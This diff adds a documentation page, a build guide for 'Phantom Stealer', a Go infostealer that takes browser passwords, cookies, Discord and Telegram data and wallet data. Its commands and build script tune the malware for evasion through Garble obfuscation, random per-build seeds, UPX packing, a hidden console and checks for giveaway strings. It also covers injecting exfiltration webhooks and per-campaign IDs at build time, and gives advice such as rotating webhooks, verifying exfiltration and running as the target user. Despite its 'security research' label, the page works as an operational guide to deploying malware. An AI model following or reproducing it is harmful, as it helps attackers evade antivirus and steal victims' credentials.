@@ -1,0 +1,783 @@
+---
+title: Building Guide
+description: Complete guide to building Phantom Stealer with various optimization levels, obfuscation, and deployment options
+---
+
+## Overview
+
+This guide covers all build options for Phantom Stealer, from basic development builds to fully obfuscated production binaries. Understanding build flags and optimization techniques is crucial for effective security research.
+
+## Requirements
+
+### Minimum Requirements
+
+<CardGroup cols={2}>
+  <Card title="Go Toolchain" icon="code">
+    **Version:** Go 1.21 or higher
+    
+    Required for compilation. Install from [go.dev](https://go.dev/dl/)
+  </Card>
+  <Card title="Operating System" icon="windows">
+    **Platform:** Windows (x64)
+    
+    Uses Windows-specific APIs (DPAPI, GDI, Registry)
+  </Card>
+  <Card title="C Compiler" icon="gear">
+    **Compiler:** GCC (MinGW-w64)
+    
+    Required for CGO/SQLite3 support
+  </Card>
+  <Card title="Git" icon="git">
+    **Version Control:** Git 2.0+
+    
+    For cloning and version management
+  </Card>
+</CardGroup>
+
+### Optional Tools
+
+- **Garble** - Code obfuscation (recommended for production)
+- **UPX** - Binary compression
+- **PowerShell 5.1+** - For build script automation
+
+### Environment Setup
+
+```bash
+# Verify Go installation
+go version
+# Should output: go version go1.21+ windows/amd64
+
+# Verify CGO is enabled
+go env CGO_ENABLED
+# Should output: 1
+
+# Install GCC (if not present)
+# Download and install MinGW-w64 from:
+# https://www.mingw-w64.org/downloads/
+
+# Set environment variables
+set CGO_ENABLED=1
+set CC=gcc
+
+# Install optional tools
+go install mvdan.cc/garble@latest
+```
+
+<Note>
+  CGO must be enabled for SQLite support, which is required for browser database decryption (passwords, cookies, history).
+</Note>
+
+## Build Methods
+
+### Standard Build
+
+Basic development build with full debug symbols and console output.
+
+```bash
+go build -o phantom.exe .
+```
+
+**Characteristics:**
+- Debug symbols included
+- Console window visible
+- Larger file size (~8-12 MB)
+- Easy to debug
+- **Not suitable for production**
+
+**Use cases:**
+- Local development
+- Debugging
+- Testing new features
+- Learning the codebase
+
+### Production Build
+
+Optimized build with stripped symbols and hidden console window.
+
+```bash
+go build -ldflags "-s -w -H windowsgui" -o phantom.exe .
+```
+
+**Build Flags Explained:**
+
+- `-ldflags` - Pass flags to the linker
+- `-s` - Strip symbol table (removes debugging symbols)
+- `-w` - Strip DWARF debug info (removes debug metadata)
+- `-H windowsgui` - Hide console window (GUI subsystem)
+
+**Result:**
+- File size reduced by ~30%
+- No console window
+- Harder to debug
+- Still detectable by signature-based AV
+
+### Obfuscated Build
+
+Maximum stealth using Garble for code obfuscation.
+
+```bash
+garble -literals build -ldflags "-s -w -H windowsgui" -o phantom.exe .
+```
+
+**Garble Features:**
+
+<Accordion title="-literals flag">
+  Obfuscates string literals in the binary. This hides:
+  - File paths
+  - Registry keys
+  - Discord/Telegram API endpoints
+  - Wallet extension IDs
+  - Configuration strings
+
+  ```go
+  // Before obfuscation
+  path := "AppData\\Roaming\\discord"
+  
+  // After obfuscation
+  path := decrypt([]byte{0x42, 0x7f, 0x9a, ...})
+  ```
+</Accordion>
+
+<Accordion title="-tiny flag">
+  Reduces binary size by:
+  - Removing reflection data
+  - Stripping more metadata
+  - Optimizing string storage
+
+  ```bash
+  garble -literals -tiny build -ldflags "-s -w -H windowsgui" -o phantom.exe .
+  ```
+</Accordion>
+
+<Accordion title="-seed flag">
+  Controls obfuscation determinism:
+  - `random` - Different output each build (recommended)
+  - `<value>` - Reproducible builds with same seed
+
+  ```bash
+  garble -literals -seed=random build -o phantom.exe .
+  ```
+</Accordion>
+
+**Installation:**
+
+```bash
+go install mvdan.cc/garble@latest
+
+# Verify installation
+garble version
+```
+
+<Warning>
+  Garble requires a clean build environment. Run `go clean -cache` if you encounter build errors.
+</Warning>
+
+### Trimpath Build
+
+Remove absolute file paths from the binary to avoid leaking development environment information.
+
+```bash
+go build -trimpath -ldflags "-s -w -H windowsgui" -o phantom.exe .
+```
+
+**What it removes:**
+- Full file paths (e.g., `C:\Users\dev\phantom\main.go` → `phantom/main.go`)
+- Module cache paths
+- GOROOT paths
+
+**Stack trace comparison:**
+
+<CodeGroup>
+```text Without -trimpath
+goroutine 1 [running]:
+main.main()
+    C:/Users/researcher/go/src/phantom-stealer/main.go:45 +0x123
+```
+
+```text With -trimpath
+goroutine 1 [running]:
+main.main()
+    phantom/main.go:45 +0x123
+```
+</CodeGroup>
+
+## PowerShell Build Script
+
+The included `build.ps1` script automates the build process with multiple options.
+
+### Basic Usage
+
+```powershell
+# Standard build
+.\build.ps1
+
+# Custom output name
+.\build.ps1 -Output mystealer.exe
+
+# Debug build
+.\build.ps1 -Debug
+
+# Obfuscated build
+.\build.ps1 -Garble
+
+# Full optimization (obfuscation + compression)
+.\build.ps1 -Garble -UPX
+```
+
+### Script Features
+
+<Steps>
+  <Step title="Environment Setup">
+    Automatically configures CGO and compiler settings:
+
+    ```powershell build.ps1
+    # set environment for CGO (required for sqlite3)
+    $env:CGO_ENABLED = "1"
+    $env:CC = "gcc"
+    ```
+  </Step>
+
+  <Step title="Dependency Management">
+    Downloads and verifies Go dependencies:
+
+    ```powershell build.ps1
+    Write-Host "[*] Downloading dependencies..." -ForegroundColor Cyan
+    go mod tidy
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "[-] Failed to download dependencies" -ForegroundColor Red
+        exit 1
+    }
+    ```
+  </Step>
+
+  <Step title="Build Configuration">
+    Applies optimized build flags:
+
+    ```powershell build.ps1
+    $ldflags = @(
+        "-s",           # strip symbol table
+        "-w",           # strip DWARF debug info
+        "-H=windowsgui" # hide console window
+    )
+
+    if (-not $Debug) {
+        $buildflags += "-trimpath"    # remove file paths from binary
+        $gcflags = "-l"               # disable inlining for smaller binary
+    }
+    ```
+  </Step>
+
+  <Step title="Obfuscation">
+    Optionally applies Garble obfuscation:
+
+    ```powershell build.ps1
+    if ($Garble) {
+        $garblePath = Get-Command garble -ErrorAction SilentlyContinue
+        if ($garblePath) {
+            Write-Host "[*] Building with Garble obfuscation..." -ForegroundColor Magenta
+            
+            $buildCmd = "garble -literals -tiny -seed=random build"
+            $buildCmd += " -ldflags=`"$ldflagStr`" -o `"$Output`" ."
+            
+            Invoke-Expression $buildCmd
+        }
+    }
+    ```
+  </Step>
+
+  <Step title="Compression">
+    Optionally compresses with UPX:
+
+    ```powershell build.ps1
+    if ($UPX) {
+        $upxPath = Get-Command upx -ErrorAction SilentlyContinue
+        if ($upxPath) {
+            Write-Host "[*] Compressing with UPX..." -ForegroundColor Cyan
+            upx --best --lzma $Output 2>$null
+            
+            $newSize = (Get-Item $Output).Length / 1KB
+            Write-Host "[+] Compressed: $([math]::Round($newSize, 2)) KB" -ForegroundColor Green
+        }
+    }
+    ```
+  </Step>
+
+  <Step title="Security Analysis">
+    Checks for suspicious strings in the output:
+
+    ```powershell build.ps1
+    # check strings for obvious indicators
+    $strings = & strings $Output 2>$null | Select-Object -First 100
+    $badStrings = @("phantom", "stealer", "password", "cookie", "discord", "telegram")
+    $found = @()
+    foreach ($bad in $badStrings) {
+        if ($strings -match $bad) {
+            $found += $bad
+        }
+    }
+
+    if ($found.Count -gt 0) {
+        Write-Host "[!] Warning: Found suspicious strings in binary:" -ForegroundColor Yellow
+        Write-Host "    $($found -join ', ')" -ForegroundColor Yellow
+        Write-Host "[!] Consider using Garble for obfuscation" -ForegroundColor Yellow
+    }
+    ```
+  </Step>
+</Steps>
+
+### Script Parameters
+
+| Parameter | Type | Default | Description |
+|-----------|------|---------|-------------|
+| `-Output` | String | `phantom.exe` | Output filename |
+| `-Debug` | Switch | `false` | Build with debug symbols |
+| `-Garble` | Switch | `false` | Enable Garble obfuscation |
+| `-UPX` | Switch | `false` | Compress with UPX |
+
+<CodeGroup>
+```powershell Development
+# Debug build with console output
+.\build.ps1 -Output phantom-dev.exe -Debug
+```
+
+```powershell Testing
+# Standard build for testing
+.\build.ps1 -Output phantom-test.exe
+```
+
+```powershell Production
+# Fully optimized production build
+.\build.ps1 -Output phantom.exe -Garble -UPX
+```
+</CodeGroup>
+
+## Build Flags Reference
+
+### Go Build Flags
+
+<AccordionGroup>
+  <Accordion title="-o <filename>">
+    Specifies the output filename.
+
+    ```bash
+    go build -o phantom.exe .
+    ```
+  </Accordion>
+
+  <Accordion title="-ldflags <flags>">
+    Pass flags to the Go linker.
+
+    Common flags:
+    - `-s` - Strip symbol table
+    - `-w` - Strip DWARF debug info
+    - `-H windowsgui` - Build GUI subsystem (no console)
+    - `-X <var>=<value>` - Set variable at link time
+
+    ```bash
+    go build -ldflags "-s -w -H windowsgui" .
+    ```
+  </Accordion>
+
+  <Accordion title="-gcflags <flags>">
+    Pass flags to the Go compiler.
+
+    Common flags:
+    - `-l` - Disable inlining
+    - `-N` - Disable optimizations
+    - `-m` - Print optimization decisions
+
+    ```bash
+    go build -gcflags="-l" .
+    ```
+  </Accordion>
+
+  <Accordion title="-trimpath">
+    Remove absolute file paths from the compiled binary.
+
+    ```bash
+    go build -trimpath .
+    ```
+  </Accordion>
+
+  <Accordion title="-tags <tags>">
+    Build with conditional compilation tags.
+
+    ```bash
+    go build -tags "prod,release" .
+    ```
+  </Accordion>
+</AccordionGroup>
+
+### Garble Flags
+
+<AccordionGroup>
+  <Accordion title="-literals">
+    Obfuscate string literals and constant expressions.
+
+    **Impact:** Hides hardcoded strings from static analysis.
+
+    ```bash
+    garble -literals build .
+    ```
+  </Accordion>
+
+  <Accordion title="-tiny">
+    Optimize for smaller binary size.
+
+    **Impact:** Removes reflection metadata, reduces size by 10-20%.
+
+    ```bash
+    garble -tiny build .
+    ```
+  </Accordion>
+
+  <Accordion title="-seed">
+    Control obfuscation reproducibility.
+
+    **Values:**
+    - `random` - Different output each build
+    - `<number>` - Reproducible with same seed
+
+    ```bash
+    garble -seed=random build .
+    ```
+  </Accordion>
+
+  <Accordion title="-debugdir">
+    Generate debug information to a directory.
+
+    **Use case:** Debug obfuscated builds.
+
+    ```bash
+    garble -debugdir=./debug build .
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Advanced Techniques
+
+### Variable Injection
+
+Set configuration at build time using `-ldflags -X`:
+
+```bash
+go build -ldflags "-X 'phantom/config.DiscordWebhook=https://...' -X 'phantom/config.BuildID=campaign-001'" .
+```
+
+**Benefits:**
+- No need to edit config.go
+- Different configs per build
+- Scriptable deployment
+
+### Cross-Compilation
+
+Build for different architectures:
+
+```bash
+# 64-bit Windows (default)
+set GOOS=windows
+set GOARCH=amd64
+go build -o phantom-x64.exe .
+
+# 32-bit Windows
+set GOOS=windows
+set GOARCH=386
+go build -o phantom-x86.exe .
+```
+
+<Warning>
+  32-bit builds may have compatibility issues with some Windows APIs. Always test thoroughly.
+</Warning>
+
+### Static Linking
+
+For maximum portability:
+
+```bash
+set CGO_ENABLED=0
+go build -ldflags "-s -w -H windowsgui -extldflags '-static'" -o phantom.exe .
+```
+
+<Note>
+  Static linking increases binary size but eliminates dependency on system DLLs.
+</Note>
+
+### UPX Compression
+
+Compress the final binary:
+
+```bash
+# Build first
+go build -ldflags "-s -w -H windowsgui" -o phantom.exe .
+
+# Compress with UPX
+upx --best --lzma phantom.exe
+
+# Result: 30-50% size reduction
+```
+
+**UPX Options:**
+- `--best` - Maximum compression
+- `--lzma` - Use LZMA algorithm
+- `--ultra-brute` - Extreme compression (slow)
+
+<Warning>
+  UPX-compressed binaries are easily detected by AV. Consider custom packers for production use.
+</Warning>
+
+## Build Optimization
+
+### Size Optimization
+
+Minimize binary size:
+
+```bash
+garble -literals -tiny build -trimpath -ldflags "-s -w -H windowsgui" -o phantom.exe .
+upx --best --lzma phantom.exe
+```
+
+**Typical sizes:**
+- Standard build: 12 MB
+- Optimized build: 8 MB
+- Garble + UPX: 3-4 MB
+
+### Stealth Optimization
+
+Maximize evasion:
+
+```bash
+# Use random seed for unique binaries
+garble -literals -tiny -seed=random build -trimpath -ldflags "-s -w -H windowsgui" -o phantom.exe .
+
+# Verify no suspicious strings
+strings phantom.exe | grep -i "phantom\|stealer\|password\|discord"
+```
+
+### Debug Optimization
+
+Easier debugging:
+
+```bash
+# Keep symbols, show console
+go build -gcflags="-N -l" -o phantom-debug.exe .
+
+# Run with race detector
+go build -race -o phantom-debug.exe .
+```
+
+## Verification
+
+### Build Verification Checklist
+
+<Steps>
+  <Step title="File Properties">
+    ```powershell
+    # Check file size
+    (Get-Item phantom.exe).Length / 1MB
+    # Should be under 10MB for optimized builds
+
+    # Check hash
+    (Get-FileHash phantom.exe -Algorithm SHA256).Hash
+    ```
+  </Step>
+
+  <Step title="String Analysis">
+    ```bash
+    # Check for suspicious strings
+    strings phantom.exe | findstr /i "phantom stealer password discord telegram"
+    # Should return nothing for obfuscated builds
+    ```
+  </Step>
+
+  <Step title="Import Analysis">
+    ```bash
+    # Check imported DLLs
+    dumpbin /imports phantom.exe
+    # Should see: kernel32.dll, ntdll.dll, user32.dll, etc.
+    ```
+  </Step>
+
+  <Step title="Subsystem Check">
+    ```bash
+    # Verify GUI subsystem
+    dumpbin /headers phantom.exe | findstr "subsystem"
+    # Should show: subsystem : 2 (Windows GUI)
+    ```
+  </Step>
+
+  <Step title="Functional Test">
+    ```bash
+    # Test execution
+    .\phantom.exe
+    # Should run silently with no console output
+    ```
+  </Step>
+</Steps>
+
+## Common Issues
+
+### Build Errors
+
+<AccordionGroup>
+  <Accordion title="CGO_ENABLED error">
+    **Error:** `sqlite3: Binary was compiled with 'CGO_ENABLED=0'`
+
+    **Solution:**
+    ```bash
+    set CGO_ENABLED=1
+    go clean -cache
+    go build .
+    ```
+  </Accordion>
+
+  <Accordion title="GCC not found">
+    **Error:** `gcc: command not found`
+
+    **Solution:**
+    - Install MinGW-w64
+    - Add to PATH: `C:\mingw-w64\bin`
+    - Verify: `gcc --version`
+  </Accordion>
+
+  <Accordion title="Garble build fails">
+    **Error:** `garble: cannot find main module`
+
+    **Solution:**
+    ```bash
+    go mod init phantom
+    go mod tidy
+    go clean -cache
+    garble build .
+    ```
+  </Accordion>
+
+  <Accordion title="Undefined reference to CreateDIBSection">
+    **Error:** Linker error with Windows API functions
+
+    **Solution:**
+    ```bash
+    # Ensure CGO is enabled
+    set CGO_ENABLED=1
+    # Add missing libraries
+    go build -ldflags "-H windowsgui -extldflags '-lgdi32 -luser32'" .
+    ```
+  </Accordion>
+</AccordionGroup>
+
+### Runtime Issues
+
+<AccordionGroup>
+  <Accordion title="Binary immediately exits">
+    **Cause:** Anti-analysis checks detecting VM/debugger
+
+    **Solution:** Build with debug config:
+    ```go config/config.go
+    AntiVM    = false
+    AntiDebug = false
+    ```
+  </Accordion>
+
+  <Accordion title="DLL load failed">
+    **Cause:** Missing runtime dependencies
+
+    **Solution:**
+    ```bash
+    # Check dependencies
+    dumpbin /dependents phantom.exe
+    # Ensure all DLLs are present or use static linking
+    ```
+  </Accordion>
+
+  <Accordion title="Browser passwords not decrypted">
+    **Cause:** DPAPI decryption requires target user context
+
+    **Solution:** Run as the target user, not Administrator
+  </Accordion>
+</AccordionGroup>
+
+## Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Development" icon="code">
+    - Use `-Debug` flag
+    - Keep symbols for debugging
+    - Disable anti-analysis
+    - Use console output
+  </Card>
+  <Card title="Testing" icon="flask">
+    - Standard optimized build
+    - Enable anti-analysis
+    - Test on clean VMs
+    - Verify data exfiltration
+  </Card>
+  <Card title="Production" icon="rocket">
+    - Use Garble obfuscation
+    - Random seed per build
+    - Remove all debug output
+    - Test on multiple systems
+  </Card>
+  <Card title="Security" icon="shield">
+    - Never commit compiled binaries
+    - Rotate webhook URLs
+    - Change mutex names
+    - Unique BuildID per campaign
+  </Card>
+</CardGroup>
+
+## Build Recipes
+
+### Quick Development Build
+
+```bash
+go build -o phantom-dev.exe .
+```
+
+### Optimized Test Build
+
+```bash
+go build -trimpath -ldflags "-s -w -H windowsgui" -o phantom-test.exe .
+```
+
+### Production Stealth Build
+
+```bash
+# Clean environment
+go clean -cache
+
+# Build with maximum obfuscation
+garble -literals -tiny -seed=random build -trimpath -ldflags "-s -w -H windowsgui" -o phantom.exe .
+
+# Optional: Compress
+upx --best --lzma phantom.exe
+
+# Verify
+strings phantom.exe | grep -i stealer
+```
+
+### Automated PowerShell Build
+
+```powershell
+# One-command production build
+.\build.ps1 -Output phantom.exe -Garble -UPX
+```
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Quick Start" icon="rocket" href="/quickstart">
+    Run your first build and test data collection
+  </Card>
+  <Card title="Configuration" icon="gear" href="/configuration/settings">
+    Customize modules, targets, and persistence options
+  </Card>
+  <Card title="Core Modules" icon="sitemap" href="/modules/browsers">
+    Understand the module design and implementation
+  </Card>
+  <Card title="Security Research" icon="shield" href="/security/detection">
+    Learn about detection and defense strategies
+  </Card>
+</CardGroup>
+
+<Tip>
+  For maximum stealth, use different build configurations for each deployment and rotate all identifiable strings (BuildID, MutexName, webhook URLs).
+</Tip>
